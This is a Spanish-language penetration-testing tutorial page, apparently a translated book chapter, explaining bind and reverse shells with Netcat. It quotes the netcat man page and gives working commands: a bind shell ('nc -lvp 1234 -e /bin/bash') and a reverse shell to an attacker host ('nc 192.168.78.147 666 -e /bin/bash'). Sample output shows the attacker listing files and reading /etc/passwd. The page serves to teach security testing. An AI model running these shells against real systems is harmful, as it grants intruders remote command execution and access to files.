---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Invertir y vincular shells(Reverser/Bind Shells)

Un _shell_ es una utilidad (software) que actúa como interfaz entre un usuario y el sistema operativo (el kernel y sus servicios). Por ejemplo, en Linux existen varios entornos de shell, como Bash, ksh y tcsh. Tradicionalmente, en Windows el shell es el símbolo del sistema (interfaz de línea de comandos), que se invoca mediante cmd.exe. Windows PowerShell es un shell de Microsoft más nuevo que combina la antigua funcionalidad CMD con un nuevo conjunto de instrucciones de scripting/cmdlet con funcionalidad de administración del sistema integrada. Los cmdlets de PowerShell permiten a los usuarios y administradores automatizar tareas complicadas con scripts reutilizables.

**NOTA** Microsoft ha publicado una lista completa y documentación para todos los comandos de Windows compatibles; consulte [_https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands_](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands) .

Repasemos las diferencias entre los caparazones enlazado e inverso. Con un shell de enlace, un atacante abre un puerto o un escucha en el sistema comprometido y espera una conexión. Esto se hace para conectarse a la víctima desde cualquier sistema y ejecutar comandos y manipular aún más a la víctima. La Figura 8-1 ilustra un shell de enlace.

_**Figura 8-1**_ _: Un shell de enlace_

Un shell inverso es una vulnerabilidad en la que un sistema atacante tiene un oyente (puerto abierto) y la víctima inicia una conexión con el sistema atacante. La Figura 8-2 ilustra un caparazón inverso.

Muchas herramientas le permiten crear shells de enlace e inversión desde un host comprometido. Algunos de los más populares son el módulo Meterpreter en Metasploit y Netcat. Netcat es una de las mejores y más versátiles herramientas para probadores de lápiz porque es liviana y muy portátil. Incluso puede ver esto explicado en los primeros párrafos de la página de manual **de netcat** , como se muestra en el Ejemplo 8-1.

_La herramienta Netcat._

```
NAME
                 nc - TCP/IP swiss army knife

SYNOPSIS
             nc [-options] hostname port[s] [ports] ...
             nc -l -p port [-options] [hostname] [port]

DESCRIPTION
             netcat is a simple unix utility which reads and writes
data across network connections, using TCP or UDP protocol. It is
designed to be a reliable "back-end" tool that can be used directly
or easily driven by other programs and scripts. At the same time, it
is a feature-rich network debugging and exploration tool, since it can
create almost any kind of connection you would need and has several
interesting built-in capabilities. Netcat, or "nc" as the actual
program is named, should have been supplied long ago as another one
of those cryptic but standard Unix tools.

In the simplest usage, "nc host port" creates a TCP connection to the
given port on the given target host. Your standard input is then sent
to the host, and anything that comes back across the connection is
sent to your standard output. This continues indefinitely, until the
network side of the connection shuts down. Note that this behavior is
different from most other applications which shut everything down and
exit after an end-of-file on the standard input.

Netcat can also function as a server, by listening for inbound
connections on arbitrary ports and then doing the same reading and
writing. With minor limitations, netcat doesn't really care if it
runs in "client" or "server" mode -- it still shovels data back and
forth until there isn't anymore left. In either mode, shutdown can be
forced after a configurable time of inactivity on the network side.

And it can do this via UDP too, so netcat is possibly the "udp
telnet-like" application you always wanted for testing your UDP-mode
servers. UDP, asthe "U" implies, gives less reliable data transmission
than TCP connections and some systems may have trouble sending large
amounts of data that way, but it's still a useful capability to have.

You may be asking "why not just use telnet to connect to arbitrary
ports?" Valid question, and here are some reasons. Telnet has the
"standard input EOF" problem, so one must introduce calculated delays
in driving scripts to allow network output to finish. This is the
main reason netcat stays running until the network side closes.
Telnet also will not transfer arbitrary binary data, because certain
characters are interpreted as telnet options and are thus removed from
the data stream. Telnet also emits some of its diagnostic messages to
standard output, where netcat keeps such things religiously separated
from its output and will never modify any of the real data in
transit unless you really want it to. And of course, telnet is
incapable of listening for inbound connections, or using UDP instead.
Netcat doesn't have any of these limitations, is much smaller and
faster than telnet, and has many other advantages.

```

Veamos Netcat en acción. Un atacante podría usar el comando **nc -lvp 1234 -e /bin/bash** en el sistema comprometido (192.168.78.6) para crear un escucha en el puerto **1234** y ejecutar ( **-e** ) el shell Bash ( **/bin/bash** ). Esto se demuestra en el ejemplo 8-2. Netcat utiliza entrada estándar (stdin), salida estándar (stdout) y error estándar (stderr) para el socket IP.

C_reación de un shell de enlace utilizando Netcat._

```
omar@jorel:~$ nc -lvp 1234 -e /bin/bash
listening on [any] 1234 ...

```

**NOTA** En los sistemas Windows, puede ejecutar la utilidad del símbolo del sistema cmd.exe con el comando **nc -lvp 1234 -e cmd.exe** Netcat.

Como se muestra en el Ejemplo 8-3, en el sistema atacante (192.168.78.147), se utiliza el comando **nc -nv 192.168.78.6 1234 para conectarse con la víctima.** Una vez que el atacante (192.168.78.147) se conecta con la víctima (192.168.78.6), se invoca el comando **ls** y se muestran tres archivos en la pantalla del atacante.

_**Ejemplo 8-3**_ _: Conexión al Bind Shell mediante Netcat_

```
root@kali:~# nc -nv 192.168.78.6 1234
(UNKNOWN) [192.168.78.6] 1234 (?) open
ls
secret_doc_1.doc
secret_doc_2.pdf
secret_doc_3.txt
```

Cuando el atacante se conecta, el mensaje resaltado en el ejemplo 8-4 se muestra en el sistema de la víctima.

_**Ejemplo 8-4**_ _: un atacante conectado a una víctima mediante un Bind Shell_

```
omar@jorel:~$ nc -lvp 1234 -e /bin/bash
listening on [any] 1234 ...
connect to [192.168.78.6] from (UNKNOWN) [192.168.78.147] 52100 
```

Uno de los desafíos de usar shells de enlace es que si el sistema de la víctima está detrás de un firewall, el puerto de escucha podría estar bloqueado. Sin embargo, si el sistema de la víctima puede iniciar una conexión con el sistema atacante en un puerto determinado, se puede utilizar un shell inverso para superar este desafío.

El ejemplo 8-5 muestra cómo crear un shell inverso usando Netcat. En este caso, para crear un shell inverso, puede usar el comando **nc -lvp 666** en el sistema atacante para escuchar un puerto específico (puerto 666 en este ejemplo).

_**Ejemplo 8-5**_ _: creación de un oyente en el sistema atacante para crear un shell inverso usando Netcat_

```
root@kali:~# nc -lvp 666
listening on [any] 666 ...
192.168.78.6: inverse host lookup failed: Unknown host
connect to [192.168.78.147] from (UNKNOWN) [192.168.78.6] 32994
ls
secret_doc_1.doc
secret_doc_2.pdf
secret_doc_3.txt 

```

Luego, en el host comprometido (la víctima), puede usar el comando **nc 192.168.78.147 666 -e /bin/bash** para conectarse al sistema atacante, como se demuestra en el Ejemplo 8-6.

_**Ejemplo 8-6**_ _: Conexión al sistema atacante (Shell inverso) mediante Netcat_

```
omar@jorel:~$ nc 192.168.78.147 666 -e /bin/bash
```

Una vez que el sistema víctima (192.168.78.6) esté conectado al sistema atacante (192.168.78.147), puede comenzar a invocar comandos, como se muestra en las líneas resaltadas en el Ejemplo 8-7.

_**Ejemplo 8-7**_ _: Ejecutar comandos en el sistema de la víctima a través de un Shell inverso_

```
root@kali:~# nc -lvp 666
listening on [any] 666 ...
192.168.78.6: inverse host lookup failed: Unknown host
connect to [192.168.78.147] from (UNKNOWN) [192.168.78.6] 32994
ls
secret_doc_1.doc
secret_doc_2.pdf
secret_doc_3.txt
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

<output omitted for brevity>

```
